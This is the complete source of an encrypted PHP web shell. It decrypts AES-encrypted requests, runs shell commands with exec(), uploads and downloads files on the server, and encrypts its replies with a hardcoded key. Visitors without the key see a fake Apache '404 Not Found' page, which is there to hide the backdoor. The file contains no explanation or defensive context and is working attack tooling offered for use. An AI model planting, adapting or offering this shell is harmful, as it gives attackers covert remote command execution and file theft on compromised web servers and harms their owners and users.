<?php

define('PAYLOAD_KEY', 'p');
define('CTRL_KEY', 'id');
define('TYPE_KEY', 'type');

define('CMD_TYPE', 'cmd');
define('GET_TYPE', 'getfile');
define('PUT_TYPE', 'putfile');

define('AES_METHOD', 'aes-256-cbc');
define('AES_KEY', 'c7b35827805788e77e41c50df4444149');

/* 
Encryption fucntions 
*/
function encrypt($data) {
    $iv = random_bytes(16);
    return $iv . openssl_encrypt($data, AES_METHOD, AES_KEY, OPENSSL_RAW_DATA, $iv);
}

function decrypt($data) {
    // $data = base64_decode($data);    
    $encrypted = substr($data, 16);
    $iv = substr($data, 0, 16);
    return openssl_decrypt($encrypted, AES_METHOD, AES_KEY, OPENSSL_RAW_DATA, $iv);
}


function run($cmd) {
    /* 
    Function wraps execution of system commands
    Returns corresponding verbose output of command
    */
    exec($cmd . " 2>&1", $output, $ret_code);
    if (isset($ret_code)) {
        if ($ret_code !== 0) {
            return array(
                'stderr' => implode("\n", $output), 
            );
        }
        elseif ($ret_code == 0 && empty($output)) {
            return array(
                'stdout' => "No output", 
            );
        }
        else {
            return array(
                'stdout' => implode("\n", $output), 
            );
        }
    }
}


function put_file($path) {
     /* 
     Function gets a file from a PUT request, and drops it on $path
     Can handle large file uploads 
     */
    $putdata = fopen("php://input", "r");
    $fp = fopen($path, "w");

    if ($fp === FALSE) {
        return array(
            'stderr' => "Could not create file $path",
        );
    }
    else {
        // chunksize + iv prefix size
        set_time_limit(0);
        $chunksize = 1024 + 32;
        while ($data = fread($putdata, $chunksize)) {
            fwrite($fp, decrypt($data));
        }

        /* Close the streams */
        fclose($fp);
        fclose($putdata);

        return array(
            'stdout' => 'Done',
        );	
    }

}

function get_file($path) {
    /* 
    Function serves file from the server, by chunks of 8KB
    Can handle large file servings 
    */
    if (file_exists($path)) {
        set_time_limit(0);
        $file = @fopen($path,"rb");
        while(!feof($file))
        {
            print(encrypt(@fread($file, 1024*8)));
            ob_flush();
            flush();
        }
        die();
    } else {
        http_response_code(404);
        die();	
    } 	
}

if (isset($_REQUEST[PAYLOAD_KEY])) {
    $cmd = decrypt($_REQUEST[PAYLOAD_KEY]);
    
    if ($cmd !== FALSE) {
        // cmd holds structure for requested operation 
        $cmd = json_decode($cmd, true);
        switch ($cmd[TYPE_KEY]) {
            case CMD_TYPE:
                $output = run($cmd[CTRL_KEY]);
                break;
            case GET_TYPE:
                $output = get_file($cmd[CTRL_KEY]);
                break;
            case PUT_TYPE:
                $output = put_file($cmd[CTRL_KEY]);
                break;
            default:
                break;
        }
    }

    header("Content-Type: application/json");
    echo encrypt(json_encode($output));
    die();
}

echo "<!DOCTYPE html>
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL ". $_SERVER['REQUEST_URI'] ." was not found on this server.</p>
<hr>
<address>" . @apache_get_version() . "</address>

</body></html>"

?>
